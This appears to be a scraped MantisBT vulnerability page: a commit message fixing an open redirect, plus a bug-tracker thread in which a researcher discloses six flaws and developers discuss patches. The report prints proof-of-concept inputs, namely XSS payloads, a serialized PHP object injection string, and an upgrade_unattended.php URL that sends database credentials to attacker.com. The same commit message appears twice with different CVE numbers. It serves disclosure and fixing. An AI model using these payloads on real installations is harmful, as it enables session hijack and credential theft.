Fix URL redirection issue in login\_page.php

```
The fix for issue #17648 failed to correct all cases of redirection.

Alejo Popovici discovered that the regex checking for URLs pointing to
other domains considered an URL with a single '/' as local, allowing
redirection e.g. to http:/google.com on certain browsers.

Fixes #17997 ([CVE-2015-1042](https://github.com/advisories/GHSA-63qw-955w-2x9f "CVE-2015-1042"))

| Summary | 0017362: Multiple vulnerabilities in MantisBT | | | | |
| Description | Hi!  I couldn't find any contact email and the IRC was kinda silent so I'm just gonna go ahead and write it here. Sorry for only making one issue, but honestly I'm too lazy and unfamiliar with how you guys set up issues for security issues so I'll let someone else do that.  Recently I have been auditing MantisBT as part of taking part of offensive security's bug bounty program (see <http://www.offensive-security.com/bug-bounty-program/>). If you're not aware, they are using MantisBT on bugs.kali.org.  I have reported several vulnerabilities that affects MantisBT to them and I'm not sure which have been referred to you guys which is why I'm writing this report. I'm just going to list them one by one:   1. Unrestricted redirect: The URL validator doesn't handle protocol relative URI's correctly, so any redirect only relying on this can be made into an unrestricted redirect. PoC: <http://www.mantisbt.org/bugs/login_page.php?return=/\/detectify.com> will take you to detectify.com 2. Persistent XSS in comments: Add a comment with this: &javascript://%E2%80%A8alert(document.domain) and it will make a link which will execute JavaScript when clicked. The problem lies in <https://github.com/mantisbt/mantisbt/blob/master/core/string_api.php>, the function "string\_insert\_hrefs" doesn't validate the protocol, which is why one can make this link (with some quirks) and execute javascript. 3. Persistent XSS in uploads: It's possible to upload Flash files and make open them inline by using an image extension. Since Flash files can execute JavaScript this becomes a persistent XSS. 4. PHP Object Injection: In the function current\_user\_get\_bug\_filter (core\current\_user\_api.php line 212). The code loads a variable from $\_GET['filter']/$\_POST['filter'] and if it's not numeric, feeds it straight into unserialize() on line 223.   The current\_user\_get\_bug\_filter function is called in 10 places, easiest is just to access /view\_filters\_page.php.  A PoC initializing a class that's loaded could look like this: /view\_filters\_page.php?filter=O:16:"MantisPHPSession":2:{s:2:"id";s:1:"1";s:3:"key";s:3:"wee";}   5. Reflected XSS in admin panel: PoC: [MantisBT]/admin/test\_langs.php?dest\_id=<script>alert(1)</script> 6. DB Credentials leak: When [MantisBT]/admin/upgrade\_unattended.php?hostname=attacker.com is accessed, MantisBT will connect to attacker.com with the current DB config credentials. | | | | |

The first issue (somewhat amusingly) - I'm aware of an alternative exploit path of /login\_cookie\_test.php?return= and been working on a fix for that already.  3 is definitely a new and not something I've already got on my radar - I've wondered before about uploading php files etc, and about virus's in images etc, but never considered flash objects and javascript - Without testing tonight as it's late - I wonder if our use of finfo to work out a mime type in 1.3 helps avoid this, or makes it worse. I suspect neither as iirc without looking at code, it was used to set the mimetype stored in the database as opposed to checking.  For 4 - and yes - equally, I've been trying to use the MANTIS\_collapse\_settings cookie to do the same via the Token\_API  In terms of number 5 - are you sure you meant test\_langs.php. In 1.3-master, there's an issue within copy\_field.php of doing something similar of:  admin/copy\_field.php?source\_id=1&dest\_id="></a><script>alert()</script><b style="  I've just tried your test\_langs example with both my 1.3 code, and what I think is my 1.2.17 instance and not finding an issue with that particular page - Am I missing something here, or have you used the wrong file path in the example.  For 6 - good catch  Summary: 1) grangeway will look at patches for this bunch 2) avlidienbrunn/others: can someone confirm if you number 5 really does mean test\_langs.php and tell me what i'm missing 3) I'll leave someone else to work out a write up on this mess later on ;) 4) I plan to also submit a patch to disable the autocomplete html attribute on the password field on the account\_page.php and login\_page.php for good practice - as I believe that's not set. |

Please create one commit per patch if possible, and if not at least reference each issue in the commit messages, to facilitate the documentation for CVEs.  2) avlidienbrunn/others: can someone confirm if you number 5 really does mean test\_langs.php and tell me what i'm missing  I can't reproduce the issue with test\_langs.php. There is no dest\_id param in this script - in fact it does not use any parameters at all. I can however confirm the issue with copy\_field.php [1]  3) I'll leave someone else to work out a write up on this mess later on ;)  I can take care of requesting CVEs and preparing the security release, provided you give me the required raw information (see [2] for details)  4) I plan to also submit a patch to disable the autocomplete html attribute on the password field on the account\_page.php and login\_page.php for good practice - as I believe that's not set.  That's not really an urgent security issue requiring immediate fixing, and furthermore unless I'm mistaken the autocomplete attribute is HTML5 only and therefore can't be used in 1.2.x (document type = xhtml1), so I would suggest to create a separate issue with 1.3.x target for this.

| [grangeway](https://mantisbt.org/bugs/view_user_page.php?id=2405)   [grangeway](https://mantisbt.org/bugs/view_user_page.php?id=2405)  2014-05-21 19:36  reporter    [~0040618](view.php?id=17362#c40618 "Direct link to note") | Damien - actually, unattended\_upgrade.php is a file I've tended to remove and replace with the updated installer in 2.0, so this issue doesn't exist at that point.  And equally in this case, this is us being dumb - you can write dumb code anywhere within mantis if you try - I'd suggest not using a computer as the solution to that one ;)  Lets think about the purpose of upgrade\_unattended.php (probably the most serious of the issues in the list)  The purpose is to upgrade an existing installation:  So step 1:  $result = @db\_connect( config\_get\_global( 'dsn', false ), config\_get\_global( 'hostname' ), config\_get\_global( 'db\_username' ), config\_get\_global( 'db\_password' ), config\_get\_global( 'database\_name' ) );  This is safe. If this fails we abort  Step 2:  We ask for query string input  That's just dumb ;)  After step 1, you already have a valid database connection to a valid database for the update, so why throw it away. The "blame" for that logic goes back to giallu/victor in 2007 and Mantis 1.1.0a3.  Personally (and clarifying my first statement about I've tended to gear towards trying to remove that file): We have an install.php - that should really have a silent mode for upgrades (for those that want it) as opposed to have 2 different installation processes.  In terms of supporting the argument regarding the amount of use upgrade\_unattended.php receives:  The code for upgrade\_unattended actually was broken (i.e. the script working as opposed to the security issue that always existed) on August 9th 2007 by thraxisp with <https://github.com/mantisbt/mantisbt/commit/9a600999dbd29d8874013c90082ac5ed817061ca> . This means that it stopped working in the following release:  release-1.1.0  Victor added support to fix the script following the August 9th 2007 change on December 29th 2013  In short, the *only* versions of Mantis that have had valid logic for upgrade\_unattended.php have been:  1.1.0rc3 - released 2007-11-23 1.1.0rc2 - release 2007-10-04 1.1.0rc1 - 2007-08-02 1.1.0a4 - 2007-08-01 1.1.0a3 - 2007-05-08  Evidently it's a well used feature :p I would make a list of the versions we've released since 1.1.0rc3 that haven't worked, but it's bedtime unfortunately ;)  side note - whilst I had thought that having a silent upgrade option was important, it does make me wonder the value of actually having said option giving the likihood of breaking it and not noticing ;) |

At least, I'm finding it not to work in IE11 on here. |

Rombert - no - I said originally I had a branch where it would help people to review if they could see history rather then a patch, and said i'd copy it to our mantisbt.org server as soon as Victor added ssh key.  So moved on to next thing whilst waiting on victor, to respond.  In the past we've given all team members to the server - we all used to have access in the past until server changed, and have been asking since then (And getting told since then that it'll be added), so at the time I was expecting it to be a quick job.  Where atrol's suggested in a private note today about using my server and giving you guys access, that approach can be implemented by this weekend. |

I for one don't want to get any private access as long as we can attach a git patchset to this bug! |

Holding security patches hostage to get a server access that Victor repeatedly said he would not grant is just plain ridiculous, and don't even get me started about your mentioning that in communications with users [e.g. [0017725:0041380](/bugs/view.php?id=17725#c41380 "0017725: [2014-10-05 12:45] grangeway")] !  For the issue at hand, if you fix MantisForge that's fine as I've been requesting that for months (actually, over a year I think) but it's really not necessary:   * git format-patch will generate a series of .patch files (one per commit), thus preservign history of changes * the patches can easily be applied using git am.   So just generate the files, attach them to the issue(s) (as a zip file if needed) and let's be done with it. |

Fix URL redirection issue in login\_page.php

```
The fix for issue #17648 failed to correct all cases of redirection.

Alejo Popovici discovered that the regex checking for URLs pointing to
other domains considered an URL with a single '/' as local, allowing
redirection e.g. to http:/google.com on certain browsers.

Fixes #17997 ([CVE-2014-6316](https://github.com/advisories/GHSA-gr3x-2r26-g8jg "CVE-2014-6316"))
